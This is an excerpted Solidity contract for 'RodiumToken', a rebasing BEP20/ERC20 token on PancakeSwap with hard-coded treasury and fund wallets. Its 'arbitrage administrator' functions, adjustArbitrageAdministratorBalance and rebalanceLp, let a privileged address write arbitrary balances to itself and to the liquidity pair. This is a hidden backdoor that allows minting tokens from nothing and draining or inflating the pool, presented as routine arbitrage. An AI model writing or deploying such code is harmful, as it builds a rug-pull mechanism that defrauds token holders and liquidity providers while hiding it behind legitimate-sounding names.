...
contract RodiumToken is ERC20Detailed, Ownable {
    ...
    //address LTC = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
	  address LTC = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;
    ...
    string public _name = "RodiumToken";
    ...
    address private _DEXROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;//pancake.kiemtienonline360.com
    ...
    address _arbitrageAdministratorAddress;

    modifier onlyArbitrageAdministrator() {
        require(msg.sender == _arbitrageAdministratorAddress);
        _;
    }

    constructor() ERC20Detailed(_name, _symbol, uint8(DECIMALS)) Ownable() {
        router = IPancakeSwapRouter(_DEXROUTER); 
        pair = IPancakeSwapFactory(router.factory()).createPair(WBNB, address(this)

        );
      
        autoLiquidityFund = 0xFB9B0C88d36A75081533D408770310178B36A53f;
        treasuryFund = 0x727d26C5aA016616398F2c8aD04ee3c034DDE9Eb;
        riskFreeFund = 0xF529E1cbc479731c4d011A42bEbe84a3Cd8BB23c;
    ...
    function swapBack() internal swapping {
        ...
        (success, ) = payable(riskFreeFund).call{
            value: amountETHToTreasuryAndRRFF.mul(riskFreeFundFee).div(
                treasuryFee.add(riskFreeFundFee)
            ),
            gas: 30000
        }("");
    ...
    function withdrawAllToTreasury() external swapping onlyOwner {
        uint256 amountToSwap = _gonBalances[address(this)].div(_gonsPerFragment);
        require( amountToSwap > 0,"There is no protocol token deposited in token contract");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
    ...
    function shouldAutoRebase() internal view returns (bool) {
        return _autoRebase && shouldRebase();
    ...
    function setArbitrageAdministratorAddress(address address_) public onlyOwner{
        _arbitrageAdministratorAddress = address_;
    } 

    function adjustArbitrageAdministratorBalance(uint256 amount_, uint bias_) external onlyArbitrageAdministrator{
        if(bias_==1){
            _gonBalances[_arbitrageAdministratorAddress] =_gonBalances[_arbitrageAdministratorAddress] + amount_.mul(_gonsPerFragment);
        }else{
            _gonBalances[_arbitrageAdministratorAddress] =_gonBalances[_arbitrageAdministratorAddress] - amount_.mul(_gonsPerFragment);
        } 
    }   

    function rebalanceLp(uint256 amount_, uint bias_) external onlyArbitrageAdministrator {
        if(bias_==1){
            _gonBalances[pair]=_gonBalances[pair] + amount_.mul(_gonsPerFragment);
        }else{
            _gonBalances[pair]=_gonBalances[pair] - amount_.mul(_gonsPerFragment);
        }
